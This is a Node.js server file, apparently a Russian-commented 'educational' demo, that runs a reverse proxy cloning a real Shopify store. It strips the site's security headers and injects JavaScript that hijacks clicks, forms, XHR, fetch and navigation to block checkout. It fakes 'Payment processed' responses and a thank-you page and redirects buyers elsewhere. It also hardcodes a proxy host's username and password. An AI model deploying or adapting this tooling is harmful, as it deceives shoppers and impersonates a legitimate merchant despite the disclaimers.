const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const { HttpsProxyAgent } = require('https-proxy-agent');
const http = require('http');
const https = require('https');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware для парсинга тела запроса (для перехвата POST запросов)
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Целевой сайт для проксирования
const TARGET_URL = process.env.TARGET_URL || 'https://beyondchargers.com';

// Настройки прокси (если требуется)
const USE_PROXY = process.env.USE_PROXY === 'true' || process.env.PROXY_USER;
let PROXY_CONFIG = null;
let proxyAgent = undefined;

if (USE_PROXY) {
  try {
    PROXY_CONFIG = {
      host: process.env.PROXY_HOST || '185.162.130.86',
      port: parseInt(process.env.PROXY_PORT || '10000'),
      auth: {
        username: process.env.PROXY_USER || 'UInVgOaurISMxHUOMkfD',
        password: process.env.PROXY_PASS || 'xnElmQSosaC9sekBD1SRzgqgBWcj2HsZ'
      }
    };
    const proxyUrl = `http://${PROXY_CONFIG.auth.username}:${PROXY_CONFIG.auth.password}@${PROXY_CONFIG.host}:${PROXY_CONFIG.port}`;
    proxyAgent = new HttpsProxyAgent(proxyUrl);
    console.log(`✅ Proxy agent configured: ${PROXY_CONFIG.host}:${PROXY_CONFIG.port}`);
  } catch (error) {
    console.error(`❌ Error configuring proxy: ${error.message}`);
    console.log('⚠️  Continuing without proxy...');
    PROXY_CONFIG = null;
    proxyAgent = undefined;
  }
}

// Функция для создания прокси-конфигурации
const proxyOptions = {
  target: TARGET_URL,
  changeOrigin: true,
  secure: true,
  followRedirects: true,
  logLevel: process.env.NODE_ENV === 'production' ? 'warn' : 'debug',
  timeout: 30000, // 30 секунд таймаут
  proxyTimeout: 30000,
  selfHandleResponse: true, // Позволяет нам полностью контролировать ответ
  // Если используется внешний прокси
  agent: proxyAgent,
  // Настройки для HTTP/HTTPS агентов
  httpAgent: proxyAgent || new http.Agent({ keepAlive: true }),
  httpsAgent: proxyAgent || new https.Agent({ keepAlive: true }),
  onProxyReq: (proxyReq, req, res) => {
    // Логирование запросов для образовательных целей
    console.log(`[PROXY] ${req.method} ${req.url} -> ${TARGET_URL}${req.url}`);
    
    try {
      // Безопасное удаление заголовков (только если запрос еще не отправлен)
      // Проверяем, можно ли модифицировать заголовки
      if (proxyReq && !proxyReq.headersSent) {
        // Удаляем заголовки только если они существуют
        const headersToRemove = ['x-forwarded-host', 'x-forwarded-proto'];
        headersToRemove.forEach(headerName => {
          try {
            if (proxyReq.getHeader && proxyReq.getHeader(headerName)) {
              proxyReq.removeHeader(headerName);
            }
          } catch (e) {
            // Игнорируем ошибки при удалении заголовков
          }
        });
      }
      
      // Устанавливаем правильные заголовки
      const targetHost = new URL(TARGET_URL).hostname;
      try {
        proxyReq.setHeader('Host', targetHost);
      } catch (e) {
        // Если не удалось установить Host, продолжаем
      }
      
      // Устанавливаем User-Agent, если его нет
      try {
        if (!proxyReq.getHeader || !proxyReq.getHeader('user-agent')) {
          proxyReq.setHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
        }
      } catch (e) {
        // Игнорируем ошибки
      }
    } catch (error) {
      // Логируем ошибку, но не прерываем выполнение
      console.error('[PROXY REQ ERROR]', error.message);
    }
  },
  onProxyRes: (proxyRes, req, res) => {
    // Проверяем, является ли это страницей оплаты/checkout
    // ИСКЛЮЧАЕМ операции с корзиной (добавление, обновление товаров)
    const pathLower = req.path.toLowerCase();
    const urlLower = req.url.toLowerCase();
    const isCartOperation = pathLower.includes('/cart/add') ||
                           pathLower.includes('/cart/update') ||
                           pathLower.includes('/cart/change') ||
                           pathLower.match(/\/cart\/?$/);
    
    const isPaymentPage = !isCartOperation && (
                         pathLower.includes('/checkout') ||
                         pathLower.includes('/payment') ||
                         pathLower.includes('/paiement') ||
                         urlLower.includes('/checkout') ||
                         urlLower.includes('/payment') ||
                         urlLower.includes('/paiement'));
    
    // Модифицируем заголовки
    const modifiedHeaders = { ...proxyRes.headers };
    
    // Модификация ответов для корректной работы прокси
    if (modifiedHeaders['location']) {
      const location = modifiedHeaders['location'];
      // Перехватываем редиректы на Shopify checkout
      if (location.includes('checkout.shopify.com') || 
          location.includes('/checkout') || 
          location.includes('/checkouts/') ||
          location.includes('/shopify_pay')) {
        console.log(`[PAYMENT INTERCEPT] Intercepting checkout redirect: ${location}`);
        modifiedHeaders['location'] = '/thank-you-payment';
      } else if (location.startsWith(TARGET_URL)) {
        // Заменяем абсолютные URL на относительные
        modifiedHeaders['location'] = location.replace(TARGET_URL, '');
      }
    }
    
    // Удаляем заголовки безопасности, которые могут блокировать прокси
    delete modifiedHeaders['x-frame-options'];
    delete modifiedHeaders['content-security-policy'];
    delete modifiedHeaders['strict-transport-security'];
    delete modifiedHeaders['x-content-type-options'];
    
    // Добавляем заголовок для образовательных целей
    modifiedHeaders['x-proxy-demo'] = 'Educational Purpose Only';
    
    // Собираем тело ответа
    let body = Buffer.alloc(0);
    
    proxyRes.on('data', (chunk) => {
      body = Buffer.concat([body, chunk]);
    });
    
    proxyRes.on('end', () => {
      // Всегда конвертируем body в строку для работы с текстовыми ответами
      let bodyString = body.length > 0 ? body.toString() : '';
      const contentType = (modifiedHeaders['content-type'] || '').toLowerCase();
      
      // Перехватываем JSON ответы от API (AJAX запросы)
      if (contentType.includes('application/json') || contentType.includes('text/json')) {
        const pathLower = req.path.toLowerCase();
        const urlLower = req.url.toLowerCase();
        // Исключаем операции с корзиной
        const isCartOperation = pathLower.includes('/cart/add') ||
                               pathLower.includes('/cart/update') ||
                               pathLower.includes('/cart/change') ||
                               pathLower.match(/\/cart\/?$/);
        
        const isPaymentAPI = (pathLower.includes('/checkout') ||
                            pathLower.includes('/payment') ||
                            pathLower.includes('/paiement') ||
                            pathLower.includes('/shopify_pay') ||
                            pathLower.includes('/checkouts/') ||
                            urlLower.includes('/checkout') ||
                            urlLower.includes('/payment') ||
                            urlLower.includes('/shopify_pay')) && !isCartOperation;
        
        if (isPaymentAPI) {
          console.log(`[PAYMENT INTERCEPT] Intercepting JSON API response: ${req.method} ${req.path}`);
          // Возвращаем JSON с редиректом на целевую ссылку
          const jsonResponse = JSON.stringify({
            redirect: 'https://www.youtube.com/results?search_query=%D0%A4%D0%90%D0%A0%D0%9C+%D0%9E%D0%9F%D0%AB%D0%A2%D0%90+%D0%91%D0%A46&sp=EgQIBBAB',
            success: true,
            message: 'Payment processed'
          });
          if (!res.headersSent) {
            res.writeHead(200, {
              'Content-Type': 'application/json; charset=utf-8',
              'x-proxy-demo': 'Educational Purpose Only'
            });
          }
          res.end(jsonResponse);
          return;
        }
      }
      
      // Перехватываем HTML-ответы и внедряем JavaScript для перехвата кликов
      if (contentType.includes('text/html') && bodyString && bodyString.length > 0) {
        try {
          console.log(`[PAYMENT INTERCEPT] Injecting JavaScript into HTML page: ${req.method} ${req.path}`);
          
          // Модифицируем HTML: заменяем ссылки на checkout
          let modifiedBodyString = bodyString;
          // Заменяем ссылки на checkout.shopify.com
          modifiedBodyString = modifiedBodyString.replace(/https?:\/\/[^"'\s<>]*checkout\.shopify\.com[^"'\s<>]*/gi, '/thank-you-payment');
          // Заменяем относительные ссылки на checkout (но не в script тегах)
          modifiedBodyString = modifiedBodyString.replace(/(href|action|data-url|data-checkout-url|data-payment-url)=["']([^"']*\/checkout[^"']*)["']/gi, '$1="/thank-you-payment"');
          modifiedBodyString = modifiedBodyString.replace(/(href|action|data-url)=["']([^"']*\/payment[^"']*)["']/gi, '$1="/thank-you-payment"');
          modifiedBodyString = modifiedBodyString.replace(/(href|action|data-url)=["']([^"']*\/paiement[^"']*)["']/gi, '$1="/thank-you-payment"');
          
          bodyString = modifiedBodyString;
          
          // Упрощенный JavaScript код - используем редирект вместо встраивания HTML
          const injectionScript = `
<script>
(function() {
  try {
    console.log('[PAYMENT INTERCEPT] JavaScript injection loaded');
    
    // Функция для редиректа на целевую ссылку
    function showThankYouPage() {
      window.location.href = 'https://www.youtube.com/results?search_query=%D0%A4%D0%90%D0%A0%D0%9C+%D0%9E%D0%9F%D0%AB%D0%A2%D0%90+%D0%91%D0%A46&sp=EgQIBBAB';
    }
    
    // Перехватываем все навигации (включая программные редиректы)
    let originalLocation = window.location;
    Object.defineProperty(window, 'location', {
      get: function() {
        return originalLocation;
      },
      set: function(url) {
        const urlStr = String(url).toLowerCase();
        if (urlStr.includes('checkout') || urlStr.includes('payment') || urlStr.includes('paiement') || urlStr.includes('shopify.com')) {
          console.log('[PAYMENT INTERCEPT] Location change intercepted:', url);
          showThankYouPage();
          return;
        }
        originalLocation.href = url;
      }
    });
    
    // Перехватываем все клики на кнопки оплаты и ссылки
    document.addEventListener('click', function(e) {
      try {
        let target = e.target;
        // Поднимаемся по DOM дереву, чтобы найти ссылку или кнопку
        while (target && target !== document.body) {
          const text = (target.textContent || target.innerText || '').toLowerCase();
          const href = target.href || target.getAttribute('href') || '';
          const className = String(target.className || '').toLowerCase();
          const id = String(target.id || '').toLowerCase();
          const onclick = target.getAttribute('onclick') || '';
          const dataUrl = target.getAttribute('data-url') || '';
          
          // Проверяем ссылки на checkout
          const isCheckoutLink = href.includes('checkout') || 
                                href.includes('payment') || 
                                href.includes('paiement') ||
                                href.includes('shopify.com');
          
          // Проверяем, является ли это кнопкой оплаты
          const isAddToCart = text.includes('add to cart') || 
                             (text.includes('add') && (text.includes('cart') || className.includes('cart') || id.includes('cart')));
          
          const isPaymentButton = !isAddToCart && (
                                 isCheckoutLink ||
                                 text.includes('paiement') ||
                                 text.includes('payment') ||
                                 (text.includes('checkout') && !text.includes('add')) ||
                                 (text.includes('pay') && !text.includes('add') && !text.includes('pal')) ||
                                 text.includes('payer') ||
                                 className.includes('checkout') && !className.includes('add') ||
                                 className.includes('payment') ||
                                 className.includes('paiement') ||
                                 (id.includes('checkout') && !id.includes('add')) ||
                                 id.includes('payment') ||
                                 onclick.toLowerCase().includes('checkout') ||
                                 onclick.toLowerCase().includes('payment') ||
                                 dataUrl.toLowerCase().includes('checkout'));
          
          if (isPaymentButton || isCheckoutLink) {
            console.log('[PAYMENT INTERCEPT] Payment button/link clicked, intercepting...', {text, href, className, id});
            e.preventDefault();
            e.stopPropagation();
            e.stopImmediatePropagation();
            showThankYouPage();
            return false;
          }
          
          target = target.parentElement;
        }
      } catch(err) {
        console.error('[PAYMENT INTERCEPT] Error in click handler:', err);
      }
    }, true);
    
    // Модифицируем все ссылки на checkout в DOM
    function modifyCheckoutLinks() {
      const links = document.querySelectorAll('a[href*="checkout"], a[href*="payment"], button[data-url*="checkout"]');
      links.forEach(link => {
        const href = link.getAttribute('href') || '';
        const dataUrl = link.getAttribute('data-url') || '';
        if (href.includes('checkout') || href.includes('payment') || href.includes('paiement') || dataUrl.includes('checkout')) {
          link.addEventListener('click', function(e) {
            console.log('[PAYMENT INTERCEPT] Checkout link modified and clicked');
            e.preventDefault();
            e.stopPropagation();
            showThankYouPage();
            return false;
          }, true);
        }
      });
    }
    
    // Модифицируем ссылки при загрузке
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', modifyCheckoutLinks);
    } else {
      modifyCheckoutLinks();
    }
    
    // Используем MutationObserver для динамического контента
    const observer = new MutationObserver(function(mutations) {
      modifyCheckoutLinks();
    });
    observer.observe(document.body, {
      childList: true,
      subtree: true
    });
    
    // Перехватываем XMLHttpRequest
    try {
      const originalXHROpen = XMLHttpRequest.prototype.open;
      const originalXHRSend = XMLHttpRequest.prototype.send;
      
      XMLHttpRequest.prototype.open = function(method, url) {
        this._url = url;
        this._method = method;
        return originalXHROpen.apply(this, arguments);
      };
      
      XMLHttpRequest.prototype.send = function() {
        const url = String(this._url || '').toLowerCase();
        
          // Перехватываем только реальные запросы к оплате, НЕ работу с корзиной
          // Исключаем: /cart/add, /cart/update, /cart/change, /cart (получение корзины)
          // Перехватываем: /checkout, /cart/checkout, /payment, /paiement, checkout.shopify.com
          const isPaymentRequest = (url.includes('/checkout') || 
                                    url.includes('/payment') || 
                                    url.includes('/paiement') ||
                                    url.includes('checkout.shopify.com') ||
                                    url.includes('/checkouts/')) &&
                                  !url.includes('/cart/add') &&
                                  !url.includes('/cart/update') &&
                                  !url.includes('/cart/change') &&
                                  !url.match(/\/cart\/?$/); // не просто /cart
          
          if (isPaymentRequest) {
            console.log('[PAYMENT INTERCEPT] Intercepting XHR request:', url);
            // Немедленно редиректим, не ждем ответа
            setTimeout(function() {
              showThankYouPage();
            }, 10);
            // НЕ отправляем запрос
            return;
          }
        
        return originalXHRSend.apply(this, arguments);
      };
    } catch(err) {
      console.error('[PAYMENT INTERCEPT] Error intercepting XHR:', err);
    }
    
    // Перехватываем Fetch API
    try {
      const originalFetch = window.fetch;
      window.fetch = function(url, options) {
        const urlStr = String(typeof url === 'string' ? url : (url && url.url) || '').toLowerCase();
        
        // Перехватываем только реальные запросы к оплате, НЕ работу с корзиной
        // Исключаем: /cart/add, /cart/update, /cart/change, /cart (получение корзины)
        // Перехватываем: /checkout, /cart/checkout, /payment, /paiement, checkout.shopify.com
        const isPaymentRequest = (urlStr.includes('/checkout') || 
                                  urlStr.includes('/payment') || 
                                  urlStr.includes('/paiement') ||
                                  urlStr.includes('checkout.shopify.com') ||
                                  urlStr.includes('/checkouts/')) &&
                                !urlStr.includes('/cart/add') &&
                                !urlStr.includes('/cart/update') &&
                                !urlStr.includes('/cart/change') &&
                                !urlStr.match(/\/cart\/?$/); // не просто /cart
        
        if (isPaymentRequest) {
          console.log('[PAYMENT INTERCEPT] Intercepting Fetch request:', urlStr);
          // Немедленно редиректим
          setTimeout(function() {
            showThankYouPage();
          }, 10);
          // Возвращаем пустой промис, чтобы не ломать код
          return Promise.resolve(new Response(JSON.stringify({ success: false, blocked: true }), {
            status: 200,
            headers: { 'Content-Type': 'application/json' }
          }));
        }
        
        return originalFetch.apply(this, arguments);
      };
    } catch(err) {
      console.error('[PAYMENT INTERCEPT] Error intercepting Fetch:', err);
    }
    
    // Перехватываем формы
    document.addEventListener('submit', function(e) {
      try {
        const form = e.target;
        const action = String(form.action || '').toLowerCase();
        const formText = (form.textContent || form.innerText || '').toLowerCase();
        
        if (action.includes('checkout') || action.includes('payment') || action.includes('paiement') ||
            formText.includes('paiement') || formText.includes('payment')) {
          console.log('[PAYMENT INTERCEPT] Form submission intercepted');
          e.preventDefault();
          e.stopPropagation();
          showThankYouPage();
          return false;
        }
      } catch(err) {
        console.error('[PAYMENT INTERCEPT] Error in form handler:', err);
      }
    }, true);
  } catch(err) {
    console.error('[PAYMENT INTERCEPT] Critical error:', err);
  }
})();
</script>
`;
          
          // Внедряем скрипт перед закрывающим тегом </body> или перед </html>
          let modifiedBody = bodyString;
          const bodyLength = modifiedBody.length;
          
          // Ищем место для вставки
          const bodyEndIndex = modifiedBody.lastIndexOf('</body>');
          const htmlEndIndex = modifiedBody.lastIndexOf('</html>');
          
          if (bodyEndIndex > -1) {
            // Вставляем перед </body>
            modifiedBody = modifiedBody.substring(0, bodyEndIndex) + injectionScript + modifiedBody.substring(bodyEndIndex);
          } else if (htmlEndIndex > -1) {
            // Вставляем перед </html>
            modifiedBody = modifiedBody.substring(0, htmlEndIndex) + injectionScript + modifiedBody.substring(htmlEndIndex);
          } else {
            // Если нет закрывающих тегов, добавляем в конец
            modifiedBody = modifiedBody + injectionScript;
          }
          
          // Проверяем, что модификация не сломала структуру
          if (modifiedBody.length > bodyLength && modifiedBody.includes('</html>')) {
            // Для всех остальных HTML ответов отправляем модифицированный контент
            if (!res.headersSent) {
              res.writeHead(proxyRes.statusCode, modifiedHeaders);
            }
            res.end(modifiedBody);
            return;
          } else {
            // Если что-то пошло не так, отправляем оригинальный контент
            console.error('[PAYMENT INTERCEPT] Failed to inject script, sending original content');
            if (!res.headersSent) {
              res.writeHead(proxyRes.statusCode, modifiedHeaders);
            }
            res.end(bodyString);
            return;
          }
        } catch (injectionError) {
          console.error('[PAYMENT INTERCEPT] Error during injection:', injectionError);
          // В случае ошибки отправляем оригинальный контент
          if (!res.headersSent) {
            res.writeHead(proxyRes.statusCode, modifiedHeaders);
          }
          res.end(bodyString);
          return;
        }
      }
      
      // Для всех остальных ответов отправляем оригинальный контент с модифицированными заголовками
      // КРИТИЧНО: с selfHandleResponse: true мы ОБЯЗАНЫ отправить ответ для всех запросов
      try {
        if (!res.headersSent) {
          res.writeHead(proxyRes.statusCode || 200, modifiedHeaders);
        }
        
        // Используем bodyString если это текст, иначе Buffer
        if (body.length > 0) {
          if (contentType.includes('text/') || 
              contentType.includes('application/json') || 
              contentType.includes('application/javascript') || 
              contentType.includes('application/x-javascript') ||
              contentType.includes('text/css') ||
              contentType.includes('text/xml')) {
            // Для текстовых ответов используем строку (если bodyString не пустой, используем его, иначе конвертируем)
            const textContent = bodyString || body.toString('utf8');
            res.end(textContent);
          } else {
            // Для бинарных данных (изображения, видео, шрифты, etc.) используем Buffer
            res.end(body);
          }
        } else {
          // Пустой ответ
          res.end();
        }
      } catch (responseError) {
        console.error('[PROXY RES] Error sending response:', responseError.message);
        // В случае ошибки пытаемся отправить оригинальный Buffer
        if (!res.headersSent) {
          try {
            res.writeHead(proxyRes.statusCode || 200);
          } catch (e) {
            // Игнорируем ошибку заголовков
          }
        }
        if (!res.writableEnded && body.length > 0) {
          try {
            res.end(body);
          } catch (e) {
            console.error('[PROXY RES] Final error sending body:', e.message);
          }
        } else if (!res.writableEnded) {
          res.end();
        }
      }
    });
    
    proxyRes.on('error', (err) => {
      console.error('[PROXY RES ERROR]', err);
      if (!res.headersSent) {
        res.status(500).send('Proxy response error');
      }
    });
  },
  onError: (err, req, res) => {
    console.error('[PROXY ERROR]', err.message);
    if (err.stack) {
      console.error('[PROXY ERROR] Stack:', err.stack);
    }
    
    // Проверяем, не отправлены ли уже заголовки
    if (!res.headersSent && !res.writableEnded) {
      try {
        res.status(502).send(`
          <!DOCTYPE html>
          <html>
          <head>
            <title>Proxy Error</title>
            <style>
              body { font-family: Arial, sans-serif; max-width: 600px; margin: 50px auto; padding: 20px; }
              .error { background: #f8d7da; border: 2px solid #dc3545; padding: 20px; border-radius: 5px; }
              a { color: #007bff; text-decoration: none; }
            </style>
          </head>
          <body>
            <div class="error">
              <h2>⚠️ Proxy Error</h2>
              <p><strong>Error:</strong> ${err.message || 'Unknown error'}</p>
              <p>The proxy server encountered an error while trying to connect to the target site.</p>
              <p><a href="/">← Back to home</a></p>
            </div>
          </body>
          </html>
        `);
      } catch (sendError) {
        console.error('[ERROR SENDING RESPONSE]', sendError.message);
        // Если не удалось отправить ответ, просто логируем ошибку
      }
    } else {
      console.error('[PROXY ERROR] Response already sent, cannot send error page');
    }
  }
};

// Создаем прокси-мидлвар
const proxy = createProxyMiddleware(proxyOptions);

// Маршрут для страницы благодарности (редирект на целевую ссылку)
app.get('/thank-you-payment', (req, res) => {
  res.redirect('https://www.youtube.com/results?search_query=%D0%A4%D0%90%D0%A0%D0%9C+%D0%9E%D0%9F%D0%AB%D0%A2%D0%90+%D0%91%D0%A46&sp=EgQIBBAB');
});

// Предупреждение на главной странице
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Educational Reverse Proxy Demo</title>
      <style>
        body { font-family: Arial, sans-serif; max-width: 800px; margin: 50px auto; padding: 20px; }
        .warning { background: #fff3cd; border: 2px solid #ffc107; padding: 20px; border-radius: 5px; margin: 20px 0; }
        .info { background: #d1ecf1; border: 2px solid #0c5460; padding: 20px; border-radius: 5px; margin: 20px 0; }
        a { color: #007bff; text-decoration: none; }
        a:hover { text-decoration: underline; }
      </style>
    </head>
    <body>
      <h1>⚠️ Educational Reverse Proxy Demonstration</h1>
      
      <div class="warning">
        <h2>⚠️ IMPORTANT WARNING</h2>
        <p><strong>This is an educational demonstration for cybersecurity research purposes only.</strong></p>
        <ul>
          <li>This proxy is set up for academic research and education</li>
          <li>Use only in controlled, authorized environments</li>
          <li>Do not use for any malicious purposes</li>
          <li>All activities are logged for educational analysis</li>
        </ul>
      </div>
      
      <div class="info">
        <h3>📚 Educational Purpose</h3>
        <p>This demonstration is part of a university dissertation on cybersecurity.</p>
        <p>It is designed to help students understand:</p>
        <ul>
          <li>How reverse proxies work</li>
          <li>Security implications of proxy servers</li>
          <li>Methods used in phishing attacks (for defensive purposes)</li>
        </ul>
      </div>
      
      <h3>🔗 Access Proxied Site</h3>
      <p>To access the proxied content, click the link below or navigate to any path:</p>
      <p><a href="/?proxy=1" style="display: inline-block; padding: 10px 20px; background: #007bff; color: white; border-radius: 5px; margin: 10px 0;">Access Proxied Site →</a></p>
      <p><strong>Target URL:</strong> ${TARGET_URL}</p>
      
      <hr>
      <p><small>Created for educational purposes. Use responsibly and ethically.</small></p>
    </body>
    </html>
  `);
});

// Страница благодарности за оплату (для образовательных целей)
const thankYouPage = `
<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Спасибо за оплату!</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      font-family: 'Arial', sans-serif;
      overflow: hidden;
    }
    .thank-you-container {
      text-align: center;
      padding: 40px;
      background: rgba(255, 255, 255, 0.95);
      border-radius: 20px;
      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
      animation: fadeIn 0.5s ease-in;
    }
    @keyframes fadeIn {
      from {
        opacity: 0;
        transform: translateY(-20px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }
    .thank-you-text {
      font-size: 72px;
      font-weight: bold;
      color: #dc3545;
      text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.2);
      margin-bottom: 20px;
      line-height: 1.2;
    }
    .subtitle {
      font-size: 24px;
      color: #333;
      margin-top: 20px;
    }
    .warning {
      margin-top: 30px;
      padding: 15px;
      background: #fff3cd;
      border: 2px solid #ffc107;
      border-radius: 10px;
      font-size: 14px;
      color: #856404;
    }
  </style>
</head>
<body>
  <div class="thank-you-container">
    <div class="thank-you-text">
      СПАСИБО ЗА ОПЛАТУ! МУР!
    </div>
    <div class="subtitle">Ваш заказ успешно обработан</div>
    <div class="warning">
      ⚠️ Это демонстрационная страница для образовательных целей
    </div>
  </div>
</body>
</html>
`;

// Список путей, которые нужно перехватывать для страницы благодарности
const paymentPaths = [
  '/checkout',
  '/cart/checkout',
  '/checkouts',
  '/payment',
  '/paiement',
  '/thank-you',
  '/success',
  '/order/success',
  '/orders/thank_you'
];

// Middleware для перехвата страниц оплаты (до прокси)
app.use((req, res, next) => {
  const pathLower = req.path.toLowerCase();
  const urlLower = req.url.toLowerCase();
  
  // ИСКЛЮЧАЕМ операции с корзиной (добавление, обновление товаров)
  const isCartOperation = pathLower.includes('/cart/add') ||
                         pathLower.includes('/cart/update') ||
                         pathLower.includes('/cart/change') ||
                         pathLower.match(/\/cart\/?$/);
  
  // Проверяем, является ли это запросом к странице оплаты
  const isPaymentPage = !isCartOperation && (
    paymentPaths.some(path => 
      pathLower.includes(path.toLowerCase())
    ) || (pathLower.includes('/checkout') && !pathLower.includes('/cart/add')) ||
       (pathLower.includes('/checkouts/') && !pathLower.includes('/cart/add')) ||
       (pathLower.includes('/payment') && !pathLower.includes('/cart')) ||
       (pathLower.includes('/paiement') && !pathLower.includes('/cart')) ||
       (pathLower.includes('/shopify_pay')) ||
       (urlLower.includes('/checkout') && !urlLower.includes('/cart/add')) ||
       (urlLower.includes('/checkouts/') && !urlLower.includes('/cart/add')) ||
       (urlLower.includes('/payment') && !urlLower.includes('/cart')) ||
       (urlLower.includes('/paiement') && !urlLower.includes('/cart')) ||
       (urlLower.includes('/shopify_pay'))
  );
  
  // Перехватываем POST/PUT/PATCH запросы к страницам оплаты (НЕ операции с корзиной)
  if (isPaymentPage && !isCartOperation && (req.method === 'POST' || req.method === 'PUT' || req.method === 'PATCH')) {
    console.log(`[PAYMENT INTERCEPT] Intercepting ${req.method} payment request: ${req.method} ${req.path} ${req.url}`);
    
    // Логируем данные для образовательных целей (не сохраняем чувствительные данные)
    if (req.body && Object.keys(req.body).length > 0) {
      console.log(`[PAYMENT INTERCEPT] Request body keys: ${Object.keys(req.body).join(', ')}`);
    }
    
    // Если это JSON запрос, возвращаем JSON с редиректом
    const acceptHeader = (req.headers.accept || '').toLowerCase();
    if (acceptHeader.includes('application/json') || acceptHeader.includes('text/json')) {
      res.setHeader('Content-Type', 'application/json; charset=utf-8');
      return res.status(200).json({
        redirect: 'https://www.youtube.com/results?search_query=%D0%A4%D0%90%D0%A0%D0%9C+%D0%9E%D0%9F%D0%AB%D0%A2%D0%90+%D0%91%D0%A46&sp=EgQIBBAB',
        success: true,
        message: 'Payment processed'
      });
    }
    
    // Иначе отправляем HTML страницу благодарности
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    return res.status(200).send(thankYouPage);
  }
  
  // Перехватываем GET запросы к страницам успеха/благодарности
  if (pathLower.includes('success') || 
      pathLower.includes('thank') ||
      pathLower.includes('order/success') ||
      urlLower.includes('success') ||
      urlLower.includes('thank')) {
    console.log(`[PAYMENT INTERCEPT] Intercepting success page: ${req.method} ${req.path} ${req.url}`);
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    return res.status(200).send(thankYouPage);
  }
  
  // Перехватываем любые запросы, содержащие "paiement" в URL (французское "оплата")
  if (pathLower.includes('paiement') || urlLower.includes('paiement')) {
    console.log(`[PAYMENT INTERCEPT] Intercepting paiement page: ${req.method} ${req.path} ${req.url}`);
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    return res.status(200).send(thankYouPage);
  }
  
  next();
});

// Middleware для обработки всех запросов
app.use((req, res, next) => {
  // Если это корневой путь без параметра proxy, показываем предупреждение
  if (req.path === '/' && req.method === 'GET' && !req.query.proxy) {
    return next();
  }
  
  // Для всех остальных запросов применяем прокси
  try {
    // Добавляем обработчик ошибок для этого запроса
    const errorHandler = (err) => {
      console.error('[PROXY MIDDLEWARE ERROR]', err.message);
      if (!res.headersSent && !res.writableEnded) {
        try {
          res.status(502).json({ 
            error: 'Proxy error', 
            message: process.env.NODE_ENV === 'production' ? 'Service temporarily unavailable' : err.message 
          });
        } catch (sendError) {
          console.error('[ERROR SENDING ERROR RESPONSE]', sendError.message);
        }
      }
    };
    
    // Применяем прокси
    proxy(req, res, next);
    
    // Обрабатываем ошибки на объекте ответа
    res.on('error', errorHandler);
  } catch (error) {
    console.error('[MIDDLEWARE ERROR]', error.message);
    if (!res.headersSent && !res.writableEnded) {
      try {
        res.status(500).json({ 
          error: 'Internal server error', 
          message: process.env.NODE_ENV === 'production' ? 'An error occurred' : error.message 
        });
      } catch (sendError) {
        console.error('[ERROR SENDING RESPONSE]', sendError.message);
      }
    }
  }
});

// Обработка ошибок Express
app.use((err, req, res, next) => {
  console.error('[EXPRESS ERROR]', err);
  if (!res.headersSent) {
    res.status(500).json({ 
      error: 'Internal Server Error', 
      message: process.env.NODE_ENV === 'production' ? 'An error occurred' : err.message 
    });
  }
});

// Обработка необработанных ошибок
process.on('uncaughtException', (error) => {
  console.error('[UNCAUGHT EXCEPTION]', error.message);
  if (error.stack) {
    console.error('[UNCAUGHT EXCEPTION] Stack:', error.stack);
  }
  // Не завершаем процесс, чтобы сервер продолжал работать
  // В production можно добавить graceful shutdown
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('[UNHANDLED REJECTION]', reason);
  if (reason instanceof Error) {
    console.error('[UNHANDLED REJECTION] Stack:', reason.stack);
  }
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Educational Reverse Proxy Server running on port ${PORT}`);
  console.log(`📡 Proxying to: ${TARGET_URL}`);
  if (PROXY_CONFIG) {
    console.log(`🔐 Using proxy: ${PROXY_CONFIG.host}:${PROXY_CONFIG.port}`);
  } else {
    console.log(`ℹ️  Direct connection (no proxy)`);
  }
  console.log(`⚠️  WARNING: This is for educational purposes only!`);
  console.log(`✅ Server is ready to accept connections`);
});

